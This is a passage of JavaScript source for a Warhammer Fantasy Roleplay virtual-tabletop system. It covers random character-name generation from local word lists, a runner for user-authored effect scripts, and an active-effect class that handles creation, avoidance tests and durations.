    // Surname option 2 - suffix
    fetch("systems/wfrp4e/names/human_surnames_suffix.txt").then(r => r.text()).then(async nameText => {
      this.surnameSuffixes = [];
      nameText.split("\n").forEach((nameGroup) => this.surnameSuffixes.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    // Male forenames
    fetch("systems/wfrp4e/names/male_human_forenames.txt").then(r => r.text()).then(async nameText => {
      this.human_male_Forenames = [];
      nameText.split("\n").forEach((nameGroup) => this.human_male_Forenames.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    // Female forenames
    fetch("systems/wfrp4e/names/female_human_forenames.txt").then(r => r.text()).then(async nameText => {
      this.human_female_Forenames = [];
      nameText.split("\n").forEach((nameGroup) => this.human_female_Forenames.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    // @@@@@@@@@@ DWARF @@@@@@@@@@@@@
    // male forenames
    fetch("systems/wfrp4e/names/male_dwarf_forenames.txt").then(r => r.text()).then(async nameText => {
      this.dwarf_male_Forenames = [];
      nameText.split("\n").forEach((nameGroup) => this.dwarf_male_Forenames.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    // Female forenames
    fetch("systems/wfrp4e/names/female_dwarf_forenames.txt").then(r => r.text()).then(async nameText => {
      this.dwarf_female_Forenames = [];
      nameText.split("\n").forEach((nameGroup) => this.dwarf_female_Forenames.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    // @@@@@@@@@@ ELF @@@@@@@@@@@@@
    // elf forenames
    fetch("systems/wfrp4e/names/elf_forenames.txt").then(r => r.text()).then(async nameText => {
      this.elf_Forenames = [];
      nameText.split("\n").forEach((nameGroup) => this.elf_Forenames.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    fetch("systems/wfrp4e/names/elf_surnames.txt").then(r => r.text()).then(async nameText => {
      this.elf_surnames = [];
      nameText.split("\n").forEach((nameGroup) => this.elf_surnames.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });
    // elf start
    fetch("systems/wfrp4e/names/elf_start.txt").then(r => r.text()).then(async nameText => {
      this.elf_start = [];
      nameText.split("\n").forEach((nameGroup) => this.elf_start.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    // elf connector
    fetch("systems/wfrp4e/names/elf_connectors.txt").then(r => r.text()).then(async nameText => {
      this.elf_connectors = [];
      nameText.split("\n").forEach((nameGroup) => this.elf_connectors.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    // female elf element
    fetch("systems/wfrp4e/names/male_elf_element.txt").then(r => r.text()).then(async nameText => {
      this.elf_male_element = [];
      nameText.split("\n").forEach((nameGroup) => this.elf_male_element.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    // male elf element
    fetch("systems/wfrp4e/names/female_elf_element.txt").then(r => r.text()).then(async nameText => {
      this.elf_female_element = [];
      nameText.split("\n").forEach((nameGroup) => this.elf_female_element.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });
    // wood elf end
    fetch("systems/wfrp4e/names/elf_wood_end.txt").then(r => r.text()).then(async nameText => {
      this.elf_wood_end = [];
      nameText.split("\n").forEach((nameGroup) => this.elf_wood_end.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });
    // high elf end
    fetch("systems/wfrp4e/names/elf_high_end.txt").then(r => r.text()).then(async nameText => {
      this.elf_high_end = [];
      nameText.split("\n").forEach((nameGroup) => this.elf_high_end.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    // @@@@@@@@@@ Halfling @@@@@@@@@@@@@
    // Halfling start
    fetch("systems/wfrp4e/names/halfling_start.txt").then(r => r.text()).then(async nameText => {
      this.halfling_start = [];
      nameText.split("\n").forEach((nameGroup) => this.halfling_start.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });

    // Male ending
    fetch("systems/wfrp4e/names/male_halfling_element.txt").then(r => r.text()).then(async nameText => {
      this.male_halfling_element = [];
      nameText.split("\n").forEach((nameGroup) => this.male_halfling_element.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });
    // Female ending
    fetch("systems/wfrp4e/names/female_halfling_element.txt").then(r => r.text()).then(async nameText => {
      this.female_halfling_element = [];
      nameText.split("\n").forEach((nameGroup) => this.female_halfling_element.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });
    // Halfling surnames
    fetch("systems/wfrp4e/names/halfling_surnames.txt").then(r => r.text()).then(async nameText => {
      this.halfling_surnames = [];
      nameText.split("\n").forEach((nameGroup) => this.halfling_surnames.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });
    // Halfling nicknames
    fetch("systems/wfrp4e/names/halfling_nicknames.txt").then(r => r.text()).then(async nameText => {
      this.halfling_nicknames = [];
      nameText.split("\n").forEach((nameGroup) => this.halfling_nicknames.push(nameGroup.split(",").map(function (item) {
        return item.trim()
      })));
    });
  }

  static human = {
    forename(gender = "male") {
      let names = game.wfrp4e.names[`human_${gender}_Forenames`];
      let size = names.length;
      let roll = Math.floor(CONFIG.Dice.randomUniform()*size);
      let nameGroup = names[roll];

      let base = nameGroup[0];
      let option;
      roll = Math.floor(CONFIG.Dice.randomUniform()*nameGroup.length);
      if (roll != 0)
        option = nameGroup[roll].substr(1);

      return game.wfrp4e.names.evaluateNamePartial(base) + (game.wfrp4e.names.evaluateNamePartial(option || ""));
    },
    surname() {
      if (Math.ceil(CONFIG.Dice.randomUniform() * 2) == 1) // Don't use prefix - suffix
      {
        let size = game.wfrp4e.names.surnames.length;
        let roll = Math.floor(CONFIG.Dice.randomUniform()*size);
        let nameGroup = game.wfrp4e.names.surnames[roll];

        let base = nameGroup[0];
        let option;
        roll = Math.floor(CONFIG.Dice.randomUniform()*nameGroup.length);
        if (roll != 0)
          option = nameGroup[roll].substr(1);

        return game.wfrp4e.names.evaluateNamePartial(base) + (game.wfrp4e.names.evaluateNamePartial(option || ""));
      }
      else // Use prefix and suffix surname
      {
        let prefixSize = game.wfrp4e.names.surnamePrefixes.length;
        let suffixSize = game.wfrp4e.names.surnameSuffixes.length;

        let prefixChoice = game.wfrp4e.names.surnamePrefixes[Math.floor(CONFIG.Dice.randomUniform()*prefixSize)][0];
        let suffixChoice = game.wfrp4e.names.surnameSuffixes[Math.floor(CONFIG.Dice.randomUniform()*suffixSize)][0];

        return game.wfrp4e.names.evaluateNamePartial(prefixChoice) + game.wfrp4e.names.evaluateNamePartial(suffixChoice)
      }
    }
  }
  static dwarf = {
    forename(gender = "male") {
      let names = game.wfrp4e.names[`dwarf_${gender}_Forenames`];
      let size = names.length;
      let roll = Math.floor(CONFIG.Dice.randomUniform()*size);
      let nameGroup = names[roll];

      let base = nameGroup[0];
      let option;
      roll = Math.floor(CONFIG.Dice.randomUniform()*(nameGroup.length));
      if (roll != 0)
        option = nameGroup[roll].substr(1);

      return game.wfrp4e.names.evaluateNamePartial(base) + (game.wfrp4e.names.evaluateNamePartial(option || ""));
    },
    surname(gender = "male") {
      let base = this.forename(gender);
      let suffix = "";
      if (gender == "male") {
        suffix = (Math.ceil(CONFIG.Dice.randomUniform() * 2) == 1 ? "snev" : "sson");
      }
      else {
        suffix = (Math.ceil(CONFIG.Dice.randomUniform() * 2) == 1 ? "sniz" : "sdottir");
      }
      return base + suffix;
    }
  }
  static helf = {
    forename(gender="male", type = "helf") {
      let source = (Math.ceil(CONFIG.Dice.randomUniform() * 2) == 1 ? "forename" : "generate");
      if (source == "forename") {
        let names = game.wfrp4e.names[`elf_Forenames`];
        let size = names.length;
        let roll = Math.floor(CONFIG.Dice.randomUniform()*size);
        return names[roll][0];
      }
      else {
        /**
         * 110
         * 010
         * 101
         * 001
         */
        let useConnector = false, useElement = false, useEnd = false;

        switch (Math.floor(CONFIG.Dice.randomUniform() * 4 + 1) == 1) {
          case 1:
            useConnector = true;
            useElement = true;
            break;
          case 2:
            useElement = true;
            break;
          case 3:
            useConnector = true;
            useEnd = true;
            break;
          case 4:
            useEnd = true;
        }


        let start = game.wfrp4e.names.RollArray("elf_start");

        let connector = useConnector ? game.wfrp4e.names.RollArray("elf_connectors") : "";
        let element = useElement ? game.wfrp4e.names.RollArray(`elf_${gender}_element`) : "";

        let elfType = type.includes("h") ? "high" : "wood";
        let end = useEnd ? game.wfrp4e.names.RollArray(`elf_${elfType}_end`) : "";
        return start + connector + element + end;
      }
    },
    surname(){
      return game.wfrp4e.names.RollArray("elf_surnames")
    }
  }

  static welf = {
    forename(gender="male", type="welf"){
      return game.wfrp4e.names.helf.forename(gender, type)
    },
    surname(){
      return game.wfrp4e.names.RollArray("elf_surnames")
    }
  }

  static halfling = {
    forename(gender="male"){
      let nickname = Math.ceil(CONFIG.Dice.randomUniform() * 2) == 1 ? `(${game.wfrp4e.names.RollArray("halfling_nicknames")})` : "";
      return `${game.wfrp4e.names.RollArray("halfling_start")}${game.wfrp4e.names.RollArray(`${gender}_halfling_element`)} ${nickname}`
    },
    surname(){
      return game.wfrp4e.names.RollArray("halfling_surnames")
    }
  }

  /**
   * Generate a Forename + Surname
   * 
   * @param {Object} options species, gender
   */
  static generateName(options = { species: "human" }) {
    if (!options.species) {
      options.species = "human";
    }
    if (options.species)
      options.species = options.species.toLowerCase();
    if (options.gender)
      options.gender = options.gender.toLowerCase();

    if (options.gender == game.i18n.localize("CHARGEN.Details.Male").toLowerCase())
      options.gender = "male";
    else if (options.gender == game.i18n.localize("CHARGEN.Details.Female").toLowerCase())
      options.gender = "female";

    // If gender not recognize, remove it (roll male or female names randomly)
    if (!["male", "female"].includes(options.gender))
      delete options.gender;

    if (!options.gender) // Generate male/female randomly
      options.gender = (Math.ceil(CONFIG.Dice.randomUniform() * 2) == 1 ? "male" : "female");

    return this[options.species].forename(options.gender) + " " + this[options.species].surname(options.gender)
  }

  /**
   * Parses down a name the partials given.
   * 
   * Name partial example: "Bar(f)sheim(er)" - randomly decide what to include within parentheses.
   * 
   * @param {String} namePartial A name partial is the inner choices
   */
  static evaluateNamePartial(namePartial) {
    var options = Array.from(namePartial.matchAll(/\((.+?)\)/g));
    for (let option of options) {
      if (Math.ceil(CONFIG.Dice.randomUniform() * 2) == 1) {
        namePartial = namePartial.replace(option[0], this.evaluateChoices(option[1]));
      }
      else {
        namePartial = namePartial.replace(option[0], "");
      }
    }
    return this.evaluateChoices(namePartial)
  }

  /**
   * A name is typically followed by choices of suffixes to use, separated by a comma.
   * 
   * Example of choices - "Aver, -land(er), -lund(er)" - Aver is not a choice, the other two are choices, however at least one of them is required.
   * 
   * @param {String} choiceString String of name chocies
   */
  static evaluateChoices(choiceString) {
    if (!choiceString)
      return choiceString
    let choices = Array.from(choiceString.matchAll(/(\w+)[\/]*/g));
    let choice = Math.floor(CONFIG.Dice.randomUniform()*choices.length);
    return choices[choice][1]
  }

  static RollArray(arrayName) {
    let elements = this[arrayName];
    let size = elements.length;
    let roll = Math.floor(CONFIG.Dice.randomUniform()*size);
    return elements[roll][0]
  }
}

class WFRP4eScript
{
    constructor(data, context={}, async=false)
    {
        this.script = data.script || data.string; // TODO: migrate string property into script in V12
        this.label = data.label;
        this.trigger = data.trigger;
        this.options = data.options || {};
        this.async = this.trigger ? !game.wfrp4e.config.syncTriggers.includes(this.trigger) : (data.async || false);
        this.context = context;
        this.context.script = this;
    }

    _handleScriptId(string)
    {
        let script;
        let regex = /\[Script.([a-zA-Z0-9]{16})\]/gm;
        let id = Array.from(string.matchAll(regex))[0]?.[1];
        if (id)
        {
            script = game.wfrp4e.config.effectScripts[id];
            if (!script)
            {
                console.warn(`Script ID ${id} not found`, this);
            }
        }
        return script || string;
    }

    execute(args)
    {
        try 
        {
            let script = this._handleScriptId(this.script);
            let scriptFunction =this.async ? Object.getPrototypeOf(async function () { }).constructor : Function;
            game.wfrp4e.utility.log("Running Script > " + this.Label);
            return (new scriptFunction("args",`${CONFIG.debug.scripts ? "debugger;" : ""}` + script)).bind(this.context)(args);
        }
        catch(e)
        {
            console.error(`Script ${this.Label} threw error: ${e}.\n Context and Arguments:`, this.context, args);
        }
    }


    // Dialog modifiers only
    hidden(args)
    {
        if (!this.options.dialog?.hideScript)
        {
            return false; // Default to not hidden if no script
        }
        else 
        {
            try 
            {
                return this._runSubscript(args, this.options.dialog?.hideScript, "Hide");
            }
            catch(e)
            {
                return false; // Default to not hidden if error
            }
        }
    }

    // Dialog modifiers only
    activated(args)
    {
        if (!this.options.dialog?.activateScript)
        {
            return false; // Default to not activated if no script
        }
        else 
        {
            try 
            {
                return this._runSubscript(args, this.options.dialog?.activateScript, "Activate");
            }
            catch(e)
            {
                return false; // Default to not activated if error
            }
        }
    }

    // Dialog modifiers only
    submission(args)
    {
        if (this.options.dialog?.submissionScript)
        {
            return this._runSubscript(args, this.options.dialog?.submissionScript, "Submission");
        }
    }

    _runSubscript(args, script, name)
    {
        try 
        {
            script = this._handleScriptId(script);
            game.wfrp4e.utility.log("Running Script > " + this.Label);
            return new Function("args",`${CONFIG.debug.scripts ? "debugger;" : ""}` + script).bind(this.context)(args);
        }
        catch(e)
        {
            console.error(`${name} Subscript ${this.Label} threw error: ${e}.\n Context and Arguments:`, this.context, args);
            throw e;
        }
    }

    scriptMessage(content, chatData={})
    {
        ChatMessage.create(foundry.utils.mergeObject({content}, this.getChatData(chatData)));
    }

    getChatData(merge={})
    {
        return foundry.utils.mergeObject({
            speaker : {alias : this.context.actor?.name || this.context?.item.name},
            flavor : this.context.effect.name || this.context.item.name || ""
        }, merge)
    }

    scriptNotification(content, type="info")
    {
        ui.notifications.notify(`<strong>${this.context.effect.name}</strong>: ${content}`, type);
    }

    get actor() 
    {
        return this.context.actor;
    }
    
    get item() 
    {
        return this.context.item;
    }

    get effect()
    {
        return this.context.effect;
    }

    get Label() 
    {
        return Roll.replaceFormulaData(this.label, this);
    }

    static createContext(document)
    {
        let context = {};
        if (document.documentName == "ActiveEffect")
        {
            context.actor = document.actor;
            context.item = document.item;
            context.effect = document;
        }

        if (document.documentName == "Item")
        {
            context.actor = document.actor;
            context.item = document;
        }
        
        if (document.documentName == "Actor")
        {
            context.actor = document;
        }

        return context;
    }
}

class EffectWfrp4e extends ActiveEffect
{

    constructor(data, context)
    {
        _migrateEffect(data);
        super(data, context);

    }


    async _preCreate(data, options, user)
    {
        await super._preCreate(data, options, user);

        if (!foundry.utils.hasProperty(data, "flags.wfrp4e.applicationData"))
        {
            this.updateSource({"flags.wfrp4e.applicationData" : this.constructor._defaultApplicationData()});            
        }

        // Take a copy of the test result that this effect comes from, if any
        // We can't use simply take a reference to the message id and retrieve the test as
        // creating a Test object before actors are ready (scripts can execute before that) throws errors
        this.updateSource({"flags.wfrp4e.sourceTest" : game.messages.get(options.message)?.getTest()});

        let preventCreation = false;
        preventCreation = await this._handleFilter(data, options, user);
        if (preventCreation)
        {
            game.wfrp4e.utility.log(game.i18n.format("EFFECT.EffectFiltered", {name : this.name}), true, this);
            return false;
        }
        preventCreation = await this._handleEffectPrevention(data, options, user);
        if (preventCreation)
        {
            ui.notifications.notify(game.i18n.format("EFFECT.EffectPrevented", {name : this.name}));
            return false; // If avoided is true, return false to stop creation
        }
        preventCreation = await this._handleConditionCreation(data, options, user);
        if (preventCreation)
        {
            return false;
        }
        await this._handleItemApplication(data, options, user);

        return await this.handleImmediateScripts(data, options, user);
    }

    async _onDelete(options, user)
    {
        await super._onDelete(options, user);
        if (!options.skipDeletingItems)
        {
            await this.deleteCreatedItems();
        }
        if (this.parent)
        {
            await Promise.all(this.parent.runScripts("update", {options, user}));
        }
        for(let script of this.scripts.filter(i => i.trigger == "deleteEffect"))
        {
            await script.execute({options, user});
        }

    }

    async _onUpdate(data, options, user)
    {
        await super._onUpdate(data, options, user);

        // If an owned effect is updated, run parent update scripts
        if (this.parent)
        {
            await Promise.all(this.parent.runScripts("update", {data, options, user}));
        }
    }

    async _onCreate(data, options, user)
    {
        await super._onCreate(data, options, user);

        if (game.user.id != user)
        {
            return;
        }

        // If an owned effect is created, run parent update scripts
        if (this.parent)
        {
            await Promise.all(this.parent.runScripts("update", {data, options, user}));
        }
        if (this.actor)
        {
            for(let script of this.scripts.filter(i => i.trigger == "addItems"))
            {
                await script.execute({data, options, user});
            }
        }
    }

    //#region Creation Handling

    async handleImmediateScripts(data, options, user)
    {

        let scripts = this.scripts.filter(i => i.trigger == "immediate");
        if (scripts.length == 0)
        {
            return true;
        }

        let run = false;
        // Effect is direct parent, it's always applied to an actor, so run scripts
        if (this.parent?.documentName == "Actor")
        {
            run = true;
        }
        // If effect is grandchild, only run scripts if the effect should apply to the actor
        else if (this.parent?.documentName == "Item" && this.parent?.parent?.documentName == "Actor" && this.transfer)
        {
            run = true;
        }
        // If effect is child of Item, and Item is what it's applying to
        else if (this.parent?.documentName == "Item" && this.applicationData.documentType == "Item")
        {
            run = true;
        }

        if (run)
        {
            if (scripts.length)
            {                                                // args.actor is often used so include it for compatibility 
                let returnValues = await Promise.all(scripts.map(s => s.execute({actor : this.actor, data, options, user})));
                return !this.scripts.every(s => s.options?.immediate?.deleteEffect) && !returnValues.every(v => v == false);
                // If all scripts agree to delete the effect, or all scripts return false, return false (to prevent creation);
            }
        }
    }

    async _handleEffectPrevention()
    {
        if (this.applicationData.avoidTest.prevention)
        {
            return this.resistEffect();
        }
    }
    
    /** 
     * This function handles creation of new conditions on an actor
     * If an Item adds a Condition, prevent that condition from being added, and instead call `addCondition` 
     * This prevents the Condition from being removed when the item is removed, but more importantly
     * `addCondition` handles Minor conditions turning into Major if a second Minor is added.
     */
    async _handleConditionCreation(data, options)
    {
        // options.condition tells us that it has already gone through addCondition, so this avoids a loop
        if (this.isCondition && !options.condition) 
        {
            // If adding a condition, prevent it and go through `addCondition`      // TODO handle these options
            await this.parent?.addCondition(this.key, this.conditionValue, {origin: this.origin, flags : this.flags});
            return true;
        }
    }

    /**
     * There is a need to support applying effects TO items, but I don't like the idea of actually
     * adding the document to the item, as it would not work with duration handling modules and 
     * would need a workaround to show the icon on a Token. Instead, when an Item type Active Effect
     * is applied, keep it on the actor, but keep a reference to the item(s) being modified (if none, modify all)
     * 
     */
    async _handleItemApplication()
    {
        let applicationData = this.applicationData;
        if (applicationData.documentType == "Item" && this.parent?.documentName == "Actor")
        {
            let items = [];
            let filter = this.filterScript;

            // If this effect specifies a filter, narrow down the items according to it
            // TODO this filter only happens on creation, so it won't apply to items added later
            if (filter)
            {
                items = this.parent.items.contents.filter(i => filter.execute(i)); // Ids of items being affected. If empty, affect all
            }

            // If this effect specifies a prompt, create an item dialog prompt to select the items
            if (applicationData.prompt)
            {
                items = await ItemDialog.create(items, "unlimited");
            }


            this.updateSource({"flags.wfrp4e.itemTargets" : items.map(i => i.id)});
        }
    }

    async _handleFilter()
    {
        let applicationData = this.applicationData;
        let filter = this.filterScript;
        if (!filter)
        {
            return;
        }

        if (applicationData.documentType == "Item" && this.parent?.documentName == "Actor")
        {
            return; // See above, _handleItemApplication
        }


        if (this.parent)
        {
            return filter.execute(this.parent);
        }
    }


    async resistEffect()
    {
        let actor = this.actor;

        // If no owning actor, no test can be done
        if (!actor)
        {
            return false;
        }

        let applicationData = this.applicationData;

        // If no test, cannot be avoided
        if (applicationData.avoidTest.value == "none")
        {
            return false;
        }

        let test;
        if (applicationData.avoidTest.value == "script")
        {
            let script = new WFRP4eScript({label : this.effect + " Avoidance", script : applicationData.avoidTest.script}, WFRP4eScript.createContext(this));
            return await script.execute();
        }
        else if (applicationData.avoidTest.value == "custom")
        {
            let options = {
                appendTitle : " - " + this.name,
                skipTargets: true
            };
            if (applicationData.avoidTest.skill)
            {
                options.fields = {difficulty : applicationData.avoidTest.difficulty};
                options.characteristic = applicationData.avoidTest.characteristic;
                test = await this.actor.setupSkill(applicationData.avoidTest.skill, options);
            }
            else if (applicationData.avoidTest.characteristic)
            {
                options.fields = {difficulty : applicationData.avoidTest.difficulty};
                test = await this.actor.setupCharacteristic(applicationData.avoidTest.characteristic, options);
            }
        }

        await test.roll();

        if (!applicationData.avoidTest.reversed)
        {
            // If the avoid test is marked as opposed, it has to win, not just succeed
            if (applicationData.avoidTest.opposed && this.getFlag("wfrp4e", "sourceTest"))
            {
                return test.result.SL > this.getFlag("wfrp4e", "sourceTest").result?.SL;
            }
            else 
            {
                return test.succeeded;
            }
        }
        else  // Reversed - Failure removes the effect
        {
            // If the avoid test is marked as opposed, it has to win, not just succeed
            if (applicationData.avoidTest.opposed && this.getFlag("wfrp4e", "sourceTest"))
            {
                return test.result.SL < this.getFlag("wfrp4e", "sourceTest").result?.SL;
            }
            else 
            {
                return !test.succeeded;
            }
        }
    }

    async runPreApplyScript(args)
    {
        if (!this.applicationData.preApplyScript)
        {
            return true; // If no preApplyScript, do not prevent applying
        }
        else 
        {
            let script = new WFRP4eScript({script : this.applicationData.preApplyScript, label : `Pre-Apply Script for ${this.name}`, async: true}, WFRP4eScript.createContext(this));
            return await script.execute(args);
        }
    }

    /**
     * Delete all items created by scripts in this effect
     */
    deleteCreatedItems()
    {
        if (this.actor)
        {
            let createdItems = this.getCreatedItems();
            if (createdItems.length)
            {
                ui.notifications.notify(game.i18n.format("EFFECT.DeletingEffectItems", {items : createdItems.map(i => i.name).join(", ")}));
                return this.actor.deleteEmbeddedDocuments("Item", createdItems.map(i => i.id));
            }
        }
    }

    getCreatedItems()
    {
        return this.actor.items.filter(i => i.getFlag("wfrp4e", "fromEffect") == this.id);
    }

    //#endregion

    prepareData() 
    {
        super.prepareData();

        if (this.applicationData.enableConditionScript && this.actor)
        {
            this.conditionScript = new WFRP4eScript({script : this.applicationData.enableConditionScript, label : `Enable Script for ${this.name}`}, WFRP4eScript.createContext(this));
            this.disabled = !this.conditionScript.execute();
        }

        // Refresh scripts
        this._scripts = undefined;

        if (this.parent?.documentName == "Item")
        {
            this.transfer = this.determineTransfer();
        }
    }

    determineTransfer()
    {
        let application = this.applicationData;

        let allowed = (application.type == "document" && application.documentType == "Actor");

        if (this.parent.documentName == "Item")
        {
            allowed = allowed && this.item.system.shouldTransferEffect(this);
        }
        
        return allowed;
    }

    // To be applied, some data needs to be changed
    // Convert type to document, as applying should always affect the document being applied
    // Set the origin as the actor's uuid
    // convert name to status so it shows up on the token
    convertToApplied(test)
    {
        let effect = this.toObject();

        // An applied targeted aura should stay as an aura type, but it is no longer targeted
        if (effect.flags.wfrp4e.applicationData.type == "aura" && effect.flags.wfrp4e.applicationData.targetedAura)
        {
            effect.flags.wfrp4e.applicationData.radius = effect.flags.wfrp4e.applicationData.radius || test.result.overcast.usage.target.current?.toString();
            effect.flags.wfrp4e.applicationData.targetedAura = false;
        }
        else 
        {
            effect.flags.wfrp4e.applicationData.type = "document";
        }

        if (this.item)
        {
            effect.flags.wfrp4e.sourceItem = this.item.uuid;

            if (this.item.type == "spell")
            {
                // Spells define their diameter
                effect.flags.wfrp4e.applicationData.radius += " / 2";
            }
        }

        effect.origin = this.actor?.uuid;
        effect.statuses = [this.key || effect.name.slugify()];
    
        let item = test?.item;

        let duration;
        if (test && test.result.overcast && test.result.overcast.usage.duration) {
            duration = test.result.overcast.usage.duration.current;
        } else if(item?.Duration) {
            duration = parseInt(item.Duration);
        }
    
        if (duration) {
            if (item.duration.value.toLowerCase().includes(game.i18n.localize("Seconds")))
            effect.duration.seconds = duration;
    
            else if (item.duration.value.toLowerCase().includes(game.i18n.localize("Minutes")))
            effect.duration.seconds = duration * 60;
    
            else if (item.duration.value.toLowerCase().includes(game.i18n.localize("Hours")))
            effect.duration.seconds = duration * 60 * 60;
    
            else if (item.duration.value.toLowerCase().includes(game.i18n.localize("Days")))
            effect.duration.seconds = duration * 60 * 60 * 24;
    
            else if (item.duration.value.toLowerCase().includes(game.i18n.localize("Rounds")))
            effect.duration.rounds = duration;
        }

        // When transferred to another actor, effects lose their reference to the item it was in
        // So if a effect pulls its avoid test from the item data, it can't, so place it manually
        // TODO: Don't think this is needed
        // if (this.applicationData.avoidTest.value == "item")
        // {
        //     effect.flags.wfrp4e.applicationData.avoidTest.value = "custom";
        //     foundry.utils.mergeObject(effect.flags.wfrp4e.applicationData.avoidTest, this.item?.getTestData() || {});
        // }

        return effect;
    }

    get scripts()
    {  
        if (!this._scripts)
        {
            this._scripts = this.scriptData.map(i => new WFRP4eScript(i, WFRP4eScript.createContext(this)));
        }
        return this._scripts;
    }

    get manualScripts()
    {
        return this.scripts.filter(i => i.trigger == "manual").map((script, index)=> {
            script.index = index; // When triggering manual scripts, need to know the index (listing all manual scripts on an actor is messy)
            return script;
        });
    }

    get filterScript()
    {
        if (this.applicationData.filter)
        {
            try 
            {
                return new WFRP4eScript({script : this.applicationData.filter, label : `${this.name} Filter`}, WFRP4eScript.createContext(this));
            }
            catch(e)
            {
                console.error("Error creating filter script: " + e);
                return null;
            }
        }
        else { return null; }
    }

    get item()
    {
        if (this.parent?.documentName == "Item")
        {
            return this.parent;
        }
        else
        {
            return undefined;
        }
    }

    get actor()
    {
        if (this.parent?.documentName == "Item")
        {
            return this.parent.parent;
        }
        else if (this.parent?.documentName == "Actor")
        {
            return this.parent;
        }
        else 
        {
            return undefined;
        }
    }

    get source()
    {
        if (this.parent?.documentName == "Item")
        {
            return this.parent.name;
        }
        else
        {
            return super.sourceName; // TODO Handle diseases like v1 sourceName getter?
        }
    }

    get scriptData() 
    {
        return this.flags?.wfrp4e?.scriptData || [];

        /**
         * label
         * string
         * trigger
         */
    }

    get key () 
    {
        return Array.from(this.statuses)[0];
    }

    get show() {
        if (game.user.isGM || !this.getFlag("wfrp4e", "hide"))
          return true
        else 
          return false
      }

    get displayLabel() {
        if (this.count > 1)
            return this.name + ` (${this.count})`
        else return this.name
    }

    // TODO: this should be used more in scripts, search for replacements
    get specifier() {
        return this.name.substring(this.name.indexOf("(") + 1, this.name.indexOf(")"))
    }

    get isCondition() 
    {
        return !!game.wfrp4e.config.conditions[this.key];
    }

    get conditionId(){
        return this.key
    }

    get isNumberedCondition() {
        return Number.isNumeric(this.conditionValue)
    }

    get conditionValue() 
    {
        return this.getFlag("wfrp4e", "value");
    }

    // Computed effects mean flagged to know that they came from a calculation, notably encumbrance causing overburdened or restrained
    get isComputed()
    {
        return this.getFlag("wfrp4e", "computed");
    }

    get testIndependent()
    {
        return this.applicationData.testIndependent
    }

    get isTargetApplied()
    {
        return this.applicationData.type == "target" || (this.applicationData.type == "aura" && this.applicationData.targetedAura)
    }

    get isAreaApplied()
    {
        return this.applicationData.type == "area"
    }

    get isCrewApplied()
    {
        return this.applicationData.type == "crew";
    }

    get sourceTest() 
    {
        let test = this.getFlag("wfrp4e", "sourceTest");
        if (test instanceof TestWFRP)
        {
            return test;
        }
        else 
        {
            return test.data;
        }
    }

    get sourceActor() 
    {
        return ChatMessage.getSpeakerActor(this.sourceTest.context.speaker);
    }

    get sourceItem() 
    {
        return fromUuidSync(this.flags.wfrp4e.sourceItem);
    }

    get itemTargets() 
    {
        let ids = this.getFlag("wfrp4e", "itemTargets");
        if (ids.length == 0)
        {
            return this.actor.items.contents;
        }
        else 
        {
            return ids.map(i => this.actor.items.get(i));
        }
    }

    get radius()
    {
        let sizeMod = 0;
        if (this.actor)
        {
            let size = game.wfrp4e.config.tokenSizes[this.actor.system.details.size.value];
            if (size > 1)
            {
                sizeMod = size;
            }
        }
        return Roll.safeEval(Roll.getFormula(Roll.parse(this.applicationData.radius, {effect : this, actor : this.actor, item : this.item}))) + sizeMod
    }

    get applicationData() 
    {
        let applicationData = foundry.utils.mergeObject(this.constructor._defaultApplicationData(), this.getFlag("wfrp4e", "applicationData"));

        // // Delete non-relevant properties based on application type
        // if (applicationData.type == "document")
        // {
        //     delete applicationData.avoidTest;
        //     delete applicationData.filters;
        //     delete applicationData.prompt;
        //     delete applicationData.consume;
        // }

        // if (applicationData.type == "damage")
        // {
        //     delete applicationData.avoidTest;

        //     if (applicationData.documentType == "Actor")
        //     {
        //         delete applicationData.filters;
        //         delete applicationData.prompt;
        //     }

        //     delete applicationData.consume;
        // }

        return applicationData;
    }

    static getCreateData(effectData, overlay=false)
    {
        const createData = foundry.utils.deepClone(effectData);
        if ( overlay ) 
        {
            createData.flags = {core : {overlay : true}};
        }
        if (!createData.duration)
        {
            createData.duration = {};
        }
        delete createData.id;
        return createData;
    }

    // I feel like "application" should be renamed to "transfer"
    static _defaultApplicationData() 
    {
        return {
            type : "document",
            documentType : "Actor",

            // Test Properties
            avoidTest : { 
                value : "none",
                opposed : false,
                prevention : true,
                reversed : false,
                manual : false,
                script : "",
                difficulty : "",
                characteristic : "",
                skill : ""
            },

            // Other

            keep : false, // Area/Aura - should they keep the effect when leaving
            radius : null, // Area/Aura radius, if null, inherit from item

            areaType : "sustained", // Area - "instantaneous" or "sustained"
            renderAura : true, // Whether or not to render the measured template

            targetedAura : false, // Aura - if the aura should be applied to a target and not self

            testIndependent : false,
            
            preApplyScript : "", // A script that runs before an effect is applied - this runs on the source, not the target
            equipTransfer : false,
            enableConditionScript : "",
            filter : "",
            prompt : false,
        };
    }

    static _defaultDialogOptions() 
    {
        return {
            targeter : false,
            hideScript : "",
            activateScript : "",
            submissionScript : ""
        };
    }

    static _defaultImmediateOptions() 
    {
        return {
            deleteEffect : false
        };
    }

    static _triggerMigrations(trigger)
    {
        let migrations = {
            "invoke" : "manual",
            "oneTime" : "immediate",
            "addItems" : "immediate",
            "dialogChoice" : "dialogChoice",
            "prefillDialog" : "dialog",
            "targetPrefillDialog" : "dialog"
        };
        return migrations[trigger] || trigger;
    }
}


function _migrateEffect(data, context)
{
    let flags = foundry.utils.getProperty(data, "flags.wfrp4e");

    if (!flags || flags._legacyData || flags.scriptData || flags.applicationData)
    {
        return;
    }


    flags.applicationData = {};
    flags.scriptData = [];
    let newScript = {
        label : data.name,
